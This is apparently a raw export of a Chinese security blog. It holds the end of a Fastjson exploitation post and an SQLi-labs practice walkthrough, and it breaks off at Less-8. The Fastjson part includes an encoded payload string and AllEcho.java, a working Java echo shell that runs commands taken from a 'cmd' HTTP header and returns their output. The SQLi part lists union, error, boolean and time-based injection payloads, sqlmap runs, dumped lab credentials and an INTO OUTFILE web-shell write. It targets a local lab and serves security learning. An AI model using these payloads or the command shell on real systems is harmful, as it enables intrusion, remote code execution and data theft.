b2$B$f8$9b$cf$96$97$f8w$ba8$J$a0$D$P$e0$m$fd$bf$I$P$e3Q$c6$40$f4G$f8$bfN$f4$t$Y$8b$Ri$a64$87$fb$5e$b4$k$e7$K0$9fQ$x$r$82$ca$Z$9f$F$a8$q$82$W$R$M$9b$88$96$ed$iu$e0$O$d8XJ$be$b5$e4$7c$t$fa$b1$8c$bc$ea$c9$fdn$i$c2$K$3c$c6$f1$R$ac$c4Q$ac$c2$T$i$9f$40$jN2$9b$9e$e4$f84$b3$u$c9$i$3a$cf$8c$Za$be$5ca$c6$5cE$8b4$9d$8f$d3$Zh$95f$oLm$da$a4$b9h$97$e6a$8bTAD$K$b4$ec$40$OeN$a2l$83$80$e8wQ$db$c9$d1$nwdrt$d4$j$ed$e2$e8$a4$3b$ea$e2$e8$K$a5vSB$We$94$o$82$dd$b4$92$Q$c2$k$Xsb$UE$Pq$u$d0W$8a$fc$m$fe$85$96$9d2b$fe$d52$acu2z$f9$ed$95$a7$cd$ac$93a$3f$87$b5$dc$Ba$u$Q$9a$93E$s$e0q$81$d2$f8$uJ$a5$7b$d8k$5c$eb$X$91$Xp$a8i$a9$bc$b8$d4$ef$5b$g$I$FB$feS0$xC$81$c55$d9E$d9$fe$qj$a5$g$b9H$a4$cbr$f6$b2$8b$94$bb$8fC$x$92K$86$b1b$A$d5E$f2$r$ac$e4$afF$vR$$$$$cd$f1$zUCj$u$e7$U$a6$V$v$nuqMnQ$ae$m$ecW$a5$81$e7$9f$rxj$94$fe$A$87$c7$vt$d5$d6$e6$cb$cf$3f$u$8a$c4$7cXt$dbhpW3$B$85$x$DL$e4$5b$99asi$ca$7c$ba$b4$9a$ae$ac$a1$T$eb$e94$83$O$8b$b0$b7h$abM$e78$a4$bd$X$7bq$lg$H9$T$c1XA$t$Y$fc$i$ba1$97$i$9a$5d$87$ca$e4$b9$Z$J$ec$e3$O$3d$80$3e$cf$c9$iyN$O$e0$7e$ecg$d8$b3$5cwWA$f97$C2$O$5cC$ae$8c$7b$r$e9$3fX$q$e3$3e$Z$af$b8$86$C$Z$x$r$e9$w$8a$Y$86$d8$3f$c1Q$60$d4$e9$7d$v$a7$xx$e5$f5$8a$3a$db$ad$q$M$E$abc$SuC$90$cf$8a$e0$ba$sg$bb$7b$K$dbW$b9$d5$fb$fe$ff$Ctz$ebem$R$A$A&quot;            &#125;        &#125; : &quot;xxx&quot;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>AllEcho.java 对于其他的中间件的兼容效果比较好。</p><pre class="line-numbers language-none"><code class="language-none">public class AllEcho &#123;    static java.util.HashSet&lt;Object&gt; h;    static ClassLoader cl &#x3D; java.lang.Thread.currentThread().getContextClassLoader();    static Class hsr;&#x2F;&#x2F;HTTPServletRequest.class    static Class hsp;&#x2F;&#x2F;HTTPServletResponse.class    static String cmd;    static Object r;    static Object p;    public AllEcho() &#123;        r &#x3D; null;        p &#x3D; null;        h &#x3D;new java.util.HashSet&lt;Object&gt;();        try &#123;            hsr &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletRequest&quot;);            hsp &#x3D; cl.loadClass(&quot;javax.servlet.http.HttpServletResponse&quot;);        &#125; catch (ClassNotFoundException e) &#123;            e.printStackTrace();        &#125;        F(java.lang.Thread.currentThread(),0);    &#125;    private static boolean i(Object obj)&#123;        if(obj&#x3D;&#x3D;null|| h.contains(obj))&#123;            return true;        &#125;        h.add(obj);        return false;    &#125;    private static void p(Object o, int depth)&#123;        if(depth &gt; 52||(r !&#x3D;null&amp;&amp; p !&#x3D;null))&#123;            return;        &#125;        if(!i(o))&#123;            if(r &#x3D;&#x3D;null&amp;&amp;hsr.isAssignableFrom(o.getClass()))&#123;                r &#x3D; o;                &#x2F;&#x2F;Tomcat特殊处理                try &#123;                    cmd &#x3D; (String)hsr.getMethod(&quot;getHeader&quot;,new Class[]&#123;String.class&#125;).invoke(o,&quot;cmd&quot;);                    if(cmd&#x3D;&#x3D;null) &#123;                        r &#x3D; null;                    &#125;else&#123;                        &#x2F;&#x2F;System.out.println(&quot;find Request&quot;);                        try &#123;                            java.lang.reflect.Method getResponse &#x3D; r.getClass().getMethod(&quot;getResponse&quot;);                            p &#x3D; getResponse.invoke(r);                        &#125; catch (Exception e) &#123;                            &#x2F;&#x2F;System.out.println(&quot;getResponse Error&quot;);                            r&#x3D;null;                            &#x2F;&#x2F;e.printStackTrace();                        &#125;                    &#125;                &#125; catch (IllegalAccessException e) &#123;                    e.printStackTrace();                &#125; catch (java.lang.reflect.InvocationTargetException e) &#123;                    e.printStackTrace();                &#125; catch (NoSuchMethodException e) &#123;                    e.printStackTrace();                &#125;            &#125;else if(p &#x3D;&#x3D;null&amp;&amp;hsp.isAssignableFrom(o.getClass()))&#123;                p &#x3D;  o;            &#125;            if(r !&#x3D;null&amp;&amp; p !&#x3D;null)&#123;                try &#123;                    String charsetName &#x3D; System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? &quot;GBK&quot;:&quot;UTF-8&quot;;                    java.io.PrintWriter pw &#x3D;  (java.io.PrintWriter)hsp.getMethod(&quot;getWriter&quot;).invoke(p);                    pw.println(new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream(),charsetName).useDelimiter(&quot;\\A&quot;).next());                    pw.flush();                    pw.close();                    &#x2F;&#x2F;p.addHeader(&quot;out&quot;,new Scanner(Runtime.getRuntime().exec(r.getHeader(&quot;cmd&quot;)).getInputStream()).useDelimiter(&quot;\\A&quot;).next());                &#125;catch (Exception e)&#123;                &#125;                return;            &#125;            F(o,depth+1);        &#125;    &#125;    private static void F(Object start, int depth)&#123;        Class n&#x3D;start.getClass();        do&#123;            for (java.lang.reflect.Field declaredField : n.getDeclaredFields()) &#123;                declaredField.setAccessible(true);                Object o &#x3D; null;                try&#123;                    o &#x3D; declaredField.get(start);                    if(!o.getClass().isArray())&#123;                        p(o,depth);                    &#125;else&#123;                        for (Object q : (Object[]) o) &#123;                            p(q, depth);                        &#125;                    &#125;                &#125;catch (Exception e)&#123;                &#125;            &#125;        &#125;while(                (n &#x3D; n.getSuperclass())!&#x3D;null        );    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2021/12/01/sqli-labs-ba-chang-xue-xi-ji-lu/"/>
      <url>/2021/12/01/sqli-labs-ba-chang-xue-xi-ji-lu/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">title: SQLI-labs靶场学习记录date: 2022-01-20 16:18:22tags:SQLI-labs 靶场<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>SQLi Labs 是一个比较全面的手工注入练习靶场，因为很全面，很少有人可以坚持做完，建议坚持打一遍秉做好笔记；</p><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p><strong>项目地址</strong>：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p>Sqli-labs 是一个开源且全面的 SQL 注入练习靶场，手工注入必备的练习环境；</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装使用 Docker 就比较简单省事儿，直接在 dockerhub 搜索，找下载量比较高（<a href="https://hub.docker.com/r/acgpiano/sqli-labs">acgpiano/sqli-labs</a>）的来安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> pull acgpiano/sqli-labs<span class="token function">docker</span> run -dt --name sqli-lab -p <span class="token number">8888</span>:80 acgpiano/sqli-labs:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>自己将<code>8888</code>修改成自己需要映射的端口，这个容器默认是<strong>没初始化</strong> SQLi-labs 数据库的，所以得自己初始化一下。</p><p>通过查看容器里面的配置文件，发现 MySQL 的 root 用户的密码为 <code>空</code>，相关版本的细节如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ mysql -e <span class="token string">"select version(),user()"</span>+-------------------------+----------------+<span class="token operator">|</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token operator">|</span> user<span class="token punctuation">(</span><span class="token punctuation">)</span>         <span class="token operator">|</span>+-------------------------+----------------+<span class="token operator">|</span> <span class="token number">5.5</span>.44-0ubuntu0.14.04.1 <span class="token operator">|</span> root@localhost <span class="token operator">|</span>+-------------------------+----------------+$ php --versionPHP <span class="token number">5.5</span>.9-1ubuntu4.13 <span class="token punctuation">(</span>cli<span class="token punctuation">)</span> <span class="token punctuation">(</span>built: Sep <span class="token number">29</span> <span class="token number">2015</span> <span class="token number">15</span>:24:49<span class="token punctuation">)</span>Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1997</span>-2014 The PHP GroupZend Engine v2.5.0, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1998</span>-2014 Zend Technologies    with Zend OPcache v7.0.3, Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">1999</span>-2014, by Zend Technologies$ <span class="token builtin class-name">cd</span> /etc/init.d/ <span class="token operator">&amp;&amp;</span> apache2 -vServer version: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>Server built:   Oct <span class="token number">14</span> <span class="token number">2015</span> <span class="token number">14</span>:20:21$ <span class="token function">uname</span> -aLinux 5fd18b4e45eb <span class="token number">4.19</span>.76-linuxkit <span class="token comment">#1 SMP Fri Apr 3 15:53:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新版的 Docker 是支持图形化 Dashboard 管理容器的；</p><p><img src="https://image.3001.net/images/20200513/15893551932887.png" alt="img"></p><h2 id="效率必备"><a href="#效率必备" class="headerlink" title="效率必备"></a>效率必备</h2><ul><li>抓包工具 Burpsuite，因为后面有 POST 注入，抓包方便分析</li><li>老版本的 Hackerbar，半自动化手工注入必备</li></ul><h1 id="基础挑战-1-20-关"><a href="#基础挑战-1-20-关" class="headerlink" title="基础挑战 1-20 关"></a>基础挑战 1-20 关</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 单引号拼接</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出查询内容<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h3><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>数据库第一个字母为 <code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">payload：?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h3><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>联合查询注入</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>报错注入</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>E -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>布尔盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>延时盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-1/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=$id</code></td></tr></tbody></table><p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-1 利用方式一致，只是闭合方式不一样而已，这里即不再啰嗦了。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">联合、报错、布尔盲注、延时盲注</td><td align="left"><code>id=(&quot;$id&quot;)</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 先双引号 在括号拼接</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span> <span class="token operator">.</span> <span class="token variable">$id</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(<span class="token interpolation"><span class="token variable">$id</span></span>) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持联合、报错、布尔盲注、延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出查询内容<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 直接单引号拼接</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持报错、布尔盲注、延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为不输出查询的结果，这就导致不可以使用联合查询的注入方式，但是并不影响正常使用报错、布尔盲注和延时盲注，除了不能联合查询注入，其他和 Less-1 利用方式一致，这里即不再啰嗦了。</p><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">报错、布尔盲注、延时盲注</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-5 利用方式一致，只是闭合方式不一样，这里即不再啰嗦了。</p><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><table><thead><tr><th align="left">请求方式</th><th align="left">注入类型</th><th align="left">拼接方式</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">布尔盲注、延时盲注</td><td align="left"><code>id=((&#39;$id&#39;))</code></td></tr></tbody></table><p><strong>源码简单分析</strong>：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 使用单引号加双层括号拼接</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=(('<span class="token interpolation"><span class="token variable">$id</span></span>')) LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># 支持布尔盲注、延时盲注</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    输出 You are in<span class="token operator">...</span><span class="token operator">.</span> <span class="token keyword">Use</span> <span class="token package">outfile</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    输出 You have an error in your <span class="token constant">SQL</span> syntax  <span class="token comment">//print_r(mysql_error());</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为这里把<code>print_r(mysql_error());</code>给注释掉了，所以就不可以使用报错注入了，这个时候只能使用布尔盲注和延时盲注，可以尝试手工验证一下然后放到 sqlmap 里面来跑。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注还是常规思路，这里实际上和前面的是一样的，就再啰嗦一下，使用 sqlmap 直接验证看看：</p><p><strong>布尔盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap 的 Payload 如下：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND 3542&#x3D;3542 AND (&#39;rmsD&#39;&#x3D;&#39;rmsD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>延时盲注</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-7/?id=1"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sqlmap 的 Payload 如下：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&#39;QUpy&#39;&#x3D;&#39;QUpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="导出数据到文件"><a href="#导出数据到文件" class="headerlink" title="导出数据到文件"></a>导出数据到文件</h3><p>因为这一关作者很明显地提示了如下信息：</p><pre class="line-numbers language-none"><code class="language-none">You are in.... Use outfile......<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认 outfile 是没有开启的，得手动开启一下，这个 Docker 靶机理论上应该是开启的，进入容器验证一下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># mysql -e "show global variables like '%secure%';"</span>+------------------+-------+<span class="token operator">|</span> Variable_name    <span class="token operator">|</span> Value <span class="token operator">|</span>+------------------+-------+<span class="token operator">|</span> secure_auth      <span class="token operator">|</span> OFF   <span class="token operator">|</span><span class="token operator">|</span> secure_file_priv <span class="token operator">|</span>       <span class="token operator">|</span>+------------------+-------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>ure_file_priv 的值为 <code>null</code> ，表示限制 mysqld 不允许导入|导出</li><li>当secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv 的值为 <code>空</code> 时，表示不对 mysqld 的导入|导出做限制</li></ul><p>下面开始直接将数据库里面的信息导出到文件中吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;users.txt&quot;--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为导出没有指定路径，所以 Linux 下 MySQL 默认导出的路径为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/var/lib/mysql/security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看下是否将数据库信息导出到文件中了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /var/lib/mysql/security/users.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这样并没有什么实际的作用，因为这个路径我们同过 Web 是无法访问的，所以这个导出的信息尽管是成功的，但是访问不到这个信息就白白作废了。</p><p>所以一般我们将这个信息导出到网站的根目录下，所以需要知道网站的物理路径信息，因为这里是靶机，所有这里就直接导出到网站根目录下看看：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">&#x2F;?id&#x3D;1&#39;))+UNION+SELECT * from security.users INTO OUTFILE &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;Less-7&#x2F;users.txt&quot;--+ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里因为这个 Docker 靶场环境没有配置好权限问题，我们通过 MySQL 直接往 Web 目录下写文件会是失败的，提示如下信息：</p><pre class="line-numbers language-verilog" data-language="verilog"><code class="language-verilog">syntaxCan't create<span class="token operator">/</span>write to file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个时候为了演示这个效果，这里只能进容器来手动把权限给开一下了：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">chmod</span> -R <span class="token number">777</span> /var/www/html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再执行上面的语句应该是可以成功的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/Less-7/users.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般情况看下可以往 Web 目录写文件的时候，直接写 shell 效率会更高：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/Less-7/info.php"</span><span class="token comment">--+ </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问对应的 URL 看看是否解析了呢：</p><p><img src="https://image.3001.net/images/20200513/15893696834265.png" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th 